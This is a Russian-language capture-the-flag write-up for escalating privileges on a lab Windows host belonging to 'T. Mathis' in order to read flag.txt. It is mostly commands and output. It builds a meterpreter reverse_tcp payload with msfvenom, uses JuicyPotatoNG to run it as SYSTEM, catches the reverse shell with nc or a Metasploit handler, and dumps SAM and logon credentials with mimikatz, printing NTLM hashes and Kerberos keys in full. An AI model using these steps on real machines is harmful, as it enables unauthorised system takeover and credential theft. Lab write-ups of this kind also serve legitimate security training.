#### Цель
Повысьте привилегии на компьютере сотрудника T. Mathis и получите доступ к содержимому файла flag.txt.

Подсказки не отображаются при отключенном VPN. Чтобы их просмотреть, настройте VPN-подключение.
 

#### решение
 

1. **SeChangeNotifyPrivilege (Enabled)**: Эта привилегия позволяет обойти проверки обхода (traverse checking). Это означает, что пользователь может получить доступ к объектам (папкам и файлам), даже если у него нет разрешения на чтение их содержимого. Это полезно для навигации по файловой системе.
    
2. **SeImpersonatePrivilege (Enabled)**: Данная привилегия позволяет процессу выдавать себя за другого пользователя после аутентификации. Это используется в сценариях, когда необходимо выполнять действия от имени другого пользователя, например, в серверных приложениях.
    
3. **SeCreateGlobalPrivilege (Enabled)**: Эта привилегия позволяет процессам создавать глобальные объекты, которые могут быть доступны всем процессам на системе. Это может быть полезно для межпроцессного взаимодействия (IPC).


SeCreateGlobalPrivilege  SeImpersonatePrivilege SeChangeNotifyPrivilege
нам будет нужен : SeImpersonatePrivilege

1. Получить 1-ый shell через письмо 
2. Загружаем туда ng and shell от метасплоита 
3. и запускаем следующую команду 

Создать
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ваш_IP_адрес> LPORT=<номер_порта> -f exe > payload.exe
```
Перекинуть и то и то
Качнуть туда https://github.com/antonioCoco/JuicyPotatoNG (с github можно качать )
Потом запускаем , (shell26 это наш payload.exe что мы создали и загрузили на машину )
```
./NG.exe -t *  -p "C:\windows\system32\cmd.exe" -a "\c /shell26.exe"
```
Перед запуском ловим shell
либо nc -lnvp
либо 
Ловим через metasploit 
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ваш_IP_адрес>
set LPORT <номер_порта>
run

```






```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

664     {0;000003e7} 1 D 36593          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 69495135    NT AUTHORITY\SYSTEM     S-1-5-18        (11g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 69632500    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

```
mimikatz # lsadump::sam
Domain : TMATHIS
SysKey : 781e07df69cddea17ec974a0f7a5d61b
Local SID : S-1-5-21-758712846-2610001738-1758918577

SAMKey : 6c3b7f669890ac753fd9e4a4c9fac9ff

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 81b748c172a435bad3d9dbf9d240857f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be873205398b325237f4872bbb99547d

* Primary:Kerberos-Newer-Keys *
    Default Salt : TMATHIS.EDU.STFAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 85d77ce253d559c004d4f2746079e0029eab472135402bd25c3e09a608b43c76
      aes128_hmac       (4096) : afa16b24867ed299bdb1396d09f4d9e0
      des_cbc_md5       (4096) : 457af7855e67644f
    OldCredentials
      aes256_hmac       (4096) : a6e95721bd870a5270db022673d01fff90b04a5195449a423fd9279f44fc09b3
      aes128_hmac       (4096) : 3d71933dfb29349e74682741c8aa0ec9
      des_cbc_md5       (4096) : fbea5bfb29d5d986
    OlderCredentials
      aes256_hmac       (4096) : 451ee6f41fb04aab968e7f7722108cb2f6a1d8bf8bf631a80b3bcdb798918671
      aes128_hmac       (4096) : b26a97c3b1eef6becd4d2bc668a8dfd6
      des_cbc_md5       (4096) : d09d4c452fc1d983

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : TMATHIS.EDU.STFAdministrator
    Credentials
      des_cbc_md5       : 457af7855e67644f
    OldCredentials
      des_cbc_md5       : fbea5bfb29d5d986


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 9f510fd6ba1b078f7d342024d38aa80d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1b7ea906e1f3f83456f4138d68f9275d

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-P0EHDO2WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6b1e4fa1aca89d9130c68db80cd0aff99acea6fcb67d93f392b51de64cabb88
      aes128_hmac       (4096) : 7025260f6740ffcce6e3ab8189a92caf
      des_cbc_md5       (4096) : e5469e4373fd9252

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-P0EHDO2WDAGUtilityAccount
    Credentials
      des_cbc_md5       : e5469e4373fd9252


RID  : 000003ee (1006)
User : ptadmin
  Hash NTLM: a3b49679fcc1ce11423f1ea41117f12c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f923f9afd5b078f3bb8cbae0e471d9a8

* Primary:Kerberos-Newer-Keys *
    Default Salt : TMATHIS.EDU.STFptadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f4281692373d108218450a6c40b40c24e2270d1ba2866c812071ae8cc94cb3e7
      aes128_hmac       (4096) : 129b81eb90ae9bab98d6408099bbe7a8
      des_cbc_md5       (4096) : 83da31d304cd3b5b
    OldCredentials
      aes256_hmac       (4096) : 5235d7d30926aed3591727e1cc3889e3f7106f82e92a1864260cf3e1d750a331
      aes128_hmac       (4096) : e1ecb714aa5a801878dd8fdde113f1b4
      des_cbc_md5       (4096) : 52808c8602fdf829
    OlderCredentials
      aes256_hmac       (4096) : 1f03a3349136d8bd94744e10a14b8f275151b1ee59e7c3ceb53262e43c349600
      aes128_hmac       (4096) : 2fd671476e3b1ce172bef5ea51d66104
      des_cbc_md5       (4096) : b00185c86407d043

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : TMATHIS.EDU.STFptadmin
    Credentials
      des_cbc_md5       : 83da31d304cd3b5b
    OldCredentials
      des_cbc_md5       : 52808c8602fdf829

```

```

Authentication Id : 0 ; 131293 (00000000:000200dd)
Session           : Service from 0
User Name         : T_Mathis
Domain            : edu
Logon Server      : DC
Logon Time        : 11/14/2024 10:24:21 AM
SID               : S-1-5-21-2956057208-890473649-882434952-1111
        msv :
         [00000003] Primary
         * Username : t_mathis
         * Domain   : edu
         * NTLM     : 31566fb55343932e1b23c7e0b37fd6d8
         * SHA1     : d6d465d2d47266f08d83dd459e43f5352eb340ca
         * DPAPI    : ef0128032476fa3ddd9672ed992026c9


```